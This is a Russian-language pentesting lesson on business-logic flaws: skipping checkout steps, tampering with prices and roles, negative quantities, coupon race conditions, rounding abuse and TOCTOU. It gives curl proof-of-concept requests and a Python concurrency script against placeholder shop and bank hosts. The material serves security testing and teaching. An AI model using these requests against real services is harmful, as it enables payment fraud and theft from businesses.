Продвинутая бизнес-логика — это баги в **правилах**, а не в коде: обход порядка шагов, ошибки округления валют, гонки на лимитах, подмена параметров и обход проверок. Такие уязвимости не находит ни один сканер — их ищут, моделируя бизнес-процесс и спрашивая «а что, если сделать шаги в другом порядке/повторить/пропустить». Это ядро `web-logic-core`; здесь — практические классы и PoC.

## Теория: почему логика ломается

Приложение предполагает «нормальный» поток: пользователь идёт по шагам, значения честные, действия не повторяются. Атакующий ломает эти допущения. Классы:

1. Workflow bypass (пропуск/переупорядочивание шагов).
2. Currency rounding / floating point.
3. Limit-overrun (гонки на лимитах).
4. Parameter tampering (подмена цен/ролей/количеств).
5. Обход проверок (валидация на клиенте, доверие к вводу).

## Класс 1: workflow bypass

Многошаговые процессы (регистрация → подтверждение → покупка; корзина → оплата → доставка) часто проверяют шаги на клиенте. Пропускаем шаги:

- Перейти сразу к `/checkout` без корзины.
- Подтвердить email по предсказуемому токену.
- Пропустить 2FA-шаг (запросить финальный эндпоинт).
- Сделать «шаг 3» без «шага 2».

```bash
curl -s -X POST https://shop.example/api/checkout -d 'cart_id=1&pay=1'   # минуя корзину
curl -s "https://app.example/api/confirm?token=000000"                   # слабый токен
```

## Класс 2: currency rounding / floating point

Ошибки округления позволяют «зарабатывать» на разнице:

- Покупка/продажа с округлением в свою пользу.
- Отрицательные количества (`quantity=-1`) → возврат денег.
- Обмен валют с двойным округлением.
- Float-погрешность: `0.1 + 0.2 != 0.3`.

```bash
curl -s -X POST https://shop.example/api/cart -d 'item=1&qty=-5'    # отрицательное количество
curl -s -X POST https://shop.example/api/exchange -d 'from=USD&to=RUB&amount=0.001'
```

## Класс 3: limit-overrun (race)

Гонки на лимитах: купон/промокод/бонус применяется многократно (см. `web-race-single-packet`). Single-packet атака отправляет N запросов одновременно → N применений.

## Класс 4: parameter tampering

Подмена значений, которые клиент «не должен» менять:

- Цена в корзине (`price=0.01`).
- Роль (`role=admin`, `isAdmin=true`).
- Количество/сумма.
- Скидка (`discount=100`).
- `user_id`/`account_id` (см. `web-idor-uuid`).

```bash
curl -s -X POST https://shop.example/api/order -d 'item=1&price=0.01&qty=1'
curl -s -X POST https://app.example/api/profile -d 'role=admin'
```

## Класс 5: обход проверок

- Валидация только на клиенте (обойти прямым запросом).
- Проверка по «чёрному списку» (обойти вариантом).
- Доверие к `X-Forwarded-For`/`X-Original-URL`.
- Проверка «если параметр есть».
- Обход шага оплаты (пометить заказ оплаченным).

## Разобранный пример: бесплатный товар

Шаг 1 — добавляем товар в корзину.
Шаг 2 — перехватываем запрос оформления и меняем цену:

```bash
curl -s -X POST https://shop.example/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -d 'item_id=42&price=0.01&qty=1'
```

Шаг 3 — если сервер доверился `price` из запроса — заказ оформлен за копейку.

## Разобранный пример: limit-overrun купона

Шаг 1 — применяем купон один раз (успех).
Шаг 2 — отправляем 20 одновременных применений через Turbo Intruder (`gate`).
Шаг 3 — если скидка применилась несколько раз — лимит обойдён.

## Разобранный пример: округление

Сценарий обмена: `amount * rate` с округлением вниз. Отправляем много мелких операций, на каждой «зарабатываем» доли копейки; или эксплуатируем возврат: покупаем за `X`, возвращаем «по цене округления» больше.

## Инструменты

- **Burp Repeater/Intruder** — подмена параметров, переупорядочивание.
- **Turbo Intruder** — гонки на лимитах.
- **`ffuf`** — перебор значений параметров.
- **Заметки/диаграмма процесса** — смоделировать шаги и их порядок.

## Что дальше / decision

1. Нарисуйте бизнес-процесс и его шаги.
2. Попробуйте пропустить/переупорядочить шаги.
3. Подменяйте цены/роли/количества.
4. Тестируйте отрицательные/дробные значения.
5. Тестируйте гонки на лимитах (Turbo Intruder).
6. Дальше — оцените ущерб (деньги/доступ) и зафиксируйте PoC.

## Частые ошибки

- **Искать только технические баги.** Логика — это про правила.
- **Считать клиентскую валидацию защитой.** Обходится прямым запросом.
- **Игнорировать отрицательные значения.** `qty=-1` — частая дыра.
- **Забыть про гонки.** Лимиты ломаются single-packet.
- **Ломать прод.** Финансовые операции — только с согласия.

## Полная карта классов бизнес-логики

Бизнес-логика — самая разнообразная категория: здесь нет «одного payload'а». Держите карту классов.

| Класс | Суть | Пример |
|-------|------|--------|
| Workflow bypass | пропуск шагов | оплата без подтверждения |
| Parameter tampering | подмена скрытых полей | `price=0`, `role=admin` |
| Limit-overrun | гонка за лимитом | купон применён N раз |
| Currency rounding | округление в свою пользу | 0.001$ × много |
| Negative/integer overflow | отрицательные значения | `amount=-100` |
| State confusion | переиспользование состояния | старый токен сброса |
| Trust in client | проверки только на фронте | `isAdmin` в JS |
| Time-of-check-to-use | TOCTOU | проверка и списание раздельно |

Каждый класс проверяется отдельным сценарием; важно понимать **инвариант** приложения (что не должно нарушаться) и атаковать именно его.

## Разобранный пример: параметр tampering в корзине

```bash
# 1) добавляем товар и смотрим запрос
curl -s -X POST https://shop.example/cart \
  -H 'Content-Type: application/json' \
  -d '{"item":"A1","qty":1,"price":100}'
# 2) меняем цену/количество
curl -s -X POST https://shop.example/checkout \
  -d '{"item":"A1","qty":-1,"price":-100}'
# 3) отрицательная итоговая сумма -> возврат средств
# {"total":-100,"status":"refund_pending"}
```

Если сервер доверяет `price` из запроса (вместо пересчёта по БД) или допускает отрицательные значения — логика сломана.

## Разобранный пример: обход шагов оформления

```bash
# шаг 1: корзина -> создаётся order_id
# шаг 2: оплата (ожидается, что 3-й шаг недоступен без оплаты)
# шаг 3: подтверждение
# атака: вызвать шаг 3 напрямую с order_id без шага 2
curl -s -X POST https://shop.example/order/123/confirm
# {"status":"shipped"}   <- заказ оформлен без оплаты
```

Проверяйте: можно ли дернуть конечный эндпоинт, минуя предыдущие; проверяет ли он серверное состояние заказа, а не только факт вызова.

## Limit-overrun и гонки в бизнес-логике

Гонка позволяет применить одноразовую операцию несколько раз.

```bash
# single-packet attack (HTTP/2) — 20 запросов применения купона одновременно
# (см. урок web-race-single-packet)
# проверяем, сколько раз применился купон
curl -s https://shop.example/cart | jq '.discounts | length'
# ожидалось 1, получено 5 -> limit-overrun
```

```python
# простой вариант на threads (HTTP/1.1)
import concurrent.futures, requests
def apply_coupon(_):
    return requests.post('https://shop.example/coupon', data={'code':'SAVE50'}).status_code
with concurrent.futures.ThreadPoolExecutor(50) as ex:
    print(list(ex.map(apply_coupon, range(50))))
```

Проверяйте все «одноразовые» операции: купоны, подарочные карты, голосования, лайки, переводы, сброс пароля.

## Currency rounding и floating point

Округление дробных сумм в свою пользу — классика. Эксплуатация: много мелких транзакций, где дробная часть накапливается в пользу атакующего.

```bash
# 0.001 у.е. * 10000 операций, при округлении вниз каждые 10 дают +0.001
for i in $(seq 1 10000); do
  curl -s -X POST https://bank.example/transfer \
    -d 'to=attacker&amount=0.001'
done
```

Также проверяйте: `0.1+0.2 != 0.3` в JSON-числах, сравнение сумм с плавающей точкой, обмен валют с двойным округлением.

```bash
# Turbo Intruder: single-packet attack (фрагмент скрипта)
```

Бизнес-логика требует понимания домена: прочитайте документацию/описание продукта, составьте карту состояний и ищите, где инвариант нарушается.

## Что делать дальше / решение

1. **Поймите продукт.** Какие инварианты (цена, баланс, лимит, роль) не должны нарушаться.
2. **Нарисуйте workflow.** Шаги и проверки между ними.
3. **Атакуйте каждый класс.** Bypass, tampering, race, rounding, negative.
4. **Проверьте клиент-сайд проверки.** Дублируются ли они на сервере.
5. **Проверьте гонки.** Все одноразовые операции.
6. **Зафиксируйте PoC.** Последовательность запросов + итоговый неверный результат.

## Trust in client: скрытые поля и «замороженные» проверки

Самая частая причина логических багов — доверие к клиенту.

```bash
# форма содержит скрытые поля, которые сервер не пересчитывает
# <input type="hidden" name="price" value="100">
curl -s -X POST https://shop.example/checkout \
  --data 'item=A1&price=1&discount=99&isAdmin=true'
# если сервер берёт price/discount/isAdmin из формы -> логика сломана
```

```bash
# проверка «только на фронте»: сервер не дублирует правило
# JS: if (user.role !== 'admin') disable button;
# но сам эндпоинт доступен напрямую:
curl -s -X POST https://app.example/admin/delete-user -d 'id=2'
# {"ok":true}   <- серверная проверка отсутствует
```

Проверяйте: любые скрытые поля, JS-валидацию, отключённые кнопки, `disabled`-поля формы. Всё, что есть только на клиенте, — не защита.

## TOCTOU и состояние между запросами

Time-of-check-to-time-of-use: проверка и использование разделены, и состояние меняется между ними.

```bash
# 1) проверяем баланс (check)
curl -s https://bank.example/balance   # 100
# 2) параллельно делаем два перевода (use)
curl -s -X POST https://bank.example/transfer -d 'amount=100' &
curl -s -X POST https://bank.example/transfer -d 'amount=100' &
wait
curl -s https://bank.example/balance   # -100  <- оба прошли
```

Аналогично: применение купона, голосование, сброс пароля, подтверждение заказа. Защита — транзакции/блокировки, а не «проверил — потом изменил».
